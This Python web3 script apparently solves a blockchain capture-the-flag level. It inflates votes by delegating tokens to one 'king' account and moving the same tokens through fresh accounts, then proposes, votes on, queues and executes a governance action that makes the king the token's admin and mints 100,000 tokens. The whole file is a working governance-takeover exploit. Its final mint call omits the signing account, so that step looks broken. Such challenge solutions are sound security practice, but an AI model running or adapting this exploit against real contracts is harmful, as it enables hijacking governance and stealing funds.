from web3 import Web3
import time

def create_account(deposit=0):
    acc = w3.eth.account.create()
    if deposit > 0:
        tx = {
            'from': moneyAccount["address"],
            'to': acc.address,
            'value': Web3.toWei(deposit, 'ether'),
            'gasPrice': Web3.toWei(50, 'gwei'),
            'nonce': w3.eth.getTransactionCount(moneyAccount["address"]),
            'gas': 2000000,
        }
        stx = w3.eth.account.sign_transaction(tx, private_key=moneyAccount["privKey"])
        tx_hash = w3.eth.send_raw_transaction(stx.rawTransaction)
        tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return {
        "address": acc.address,
        "privKey": acc.privateKey.hex()
    }

def send_and_sign_tx(fcall, account, value=0):
    tx = fcall.build_transaction(
        {
            'from': account['address'],
            'nonce': w3.eth.get_transaction_count(account['address']),
            'value': Web3.toWei(value, "ether")
        }
    )
    stx = w3.eth.account.sign_transaction(tx, private_key=account["privKey"])
    tx_hash = w3.eth.send_raw_transaction(stx.rawTransaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return tx_receipt

if __name__ == "__main__":
    RPC_URL = "https://chall.bisc.chainlight.io/chall2/rpc/chall2_2111_a7076ac760d14b3c10c3e00b38a68366915e29b32b464c537fb557d36b2eff3d"
    account = {
        "address": "0xa267E4f15c979289993a95E22cA9cDf077B708Ba",
        "privKey": "0x4141414141414141414141414141414141414141414141414141414141414141"
    }
    contractAddress = "0x135bA7F14dB39f76e53F463F753472F4a029a6E7"
    with open("../src/abi/Level5.abi", "r") as f:
        contractAbi = f.read()
    with open("../src/abi/DreamToken.abi", "r") as f:
        dtAbi = f.read()
    with open("../src/abi/GovernorAlpha.abi", "r") as f:
        govAbi = f.read()
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    contractIface = w3.eth.contract(address=contractAddress, abi=contractAbi)
    dtAddress, tlAddress, govAddress = contractIface.functions.getAddresses().call()

    tokenIface = w3.eth.contract(address=dtAddress, abi=dtAbi)
    govIface = w3.eth.contract(address=govAddress, abi=govAbi)

    
    doPropose = True
    
    for i in range(5):
        send_and_sign_tx(contractIface.functions.buy(), account, 1)
    moneyAccount = account
    kingAccount = create_account(2)
    print(kingAccount)

    for i in range(11):
        moverAccount = create_account(0.01)
        nextAccount = create_account(0.01)
        cf = tokenIface.functions.delegate(kingAccount["address"])
        send_and_sign_tx(cf, account)

        cf = tokenIface.functions.approve(moverAccount["address"], 5)
        send_and_sign_tx(cf, account)

        cf = tokenIface.functions.transferFrom(account["address"], nextAccount["address"], 5)
        send_and_sign_tx(cf, moverAccount)

        account = nextAccount
        
        votes = tokenIface.functions.getCurrentVotes(kingAccount["address"]).call()
        bal = tokenIface.functions.balanceOf(account["address"]).call()
        print("[+] king votes: {}".format(votes))
        print("[+] current balance: {}".format(bal))

    # make a proposition
    # function propose(address[] targets, uint[] values, string[] memory signatures, bytes[] calldatas, string description)
    targets = [dtAddress]
    values = [0]
    signatures = [""]
    calldatas = [tokenIface.encodeABI("setAdmin", [kingAccount["address"]])]
    description = ""
    cf = govIface.functions.propose(targets, values, signatures, calldatas, description)
    send_and_sign_tx(cf, kingAccount)
    print("[*] Made proposition to become admin")

    # wait for 1 block
    startBN = w3.eth.get_block_number()
    print("[*] Current block number: {}".format(startBN))
    print("[*] Waiting until block number becomes: {}".format(startBN + 1))
    dummyAccount = create_account(0.01)
    while True:
        curBN = w3.eth.get_block_number()
        if curBN == startBN +1 :
            break
        cf = tokenIface.functions.delegate(dummyAccount["address"])
        send_and_sign_tx(cf, dummyAccount)
        
    print("[+] Now, ready to vote!")
    cf = govIface.functions.castVote(1, True)
    send_and_sign_tx(cf, kingAccount)

    startBN = w3.eth.get_block_number()
    print("[*] Current block number: {}".format(startBN))
    print("[*] Waiting until block number becomes: {}".format(startBN + 20))
    while True:
        curBN = w3.eth.get_block_number()
        if curBN == startBN + 20 :
            break
        cf = tokenIface.functions.delegate(dummyAccount["address"])
        send_and_sign_tx(cf, dummyAccount)

    print("[+] Ready to queue")
    cf = govIface.functions.queue(1)
    send_and_sign_tx(cf, kingAccount)

    print("[+] Waiting 5 minutes...")
    time.sleep(60*5)
    cf = govIface.functions.execute(1)
    send_and_sign_tx(cf, kingAccount)

    admin = tokenIface.functions.admin().call()
    print("[*] admin: {}".format(admin))
    print("[*] king: {}".format(kingAccount["address"]))

    cf = tokenIface.functions.mint(kingAccount["address"], 100000)
    send_and_sign_tx(cf)
    kingBal = tokenIface.functions.balanceOf(kingAccount["address"]).call()
    print("[+] King's deposit: {}".format(kingBal))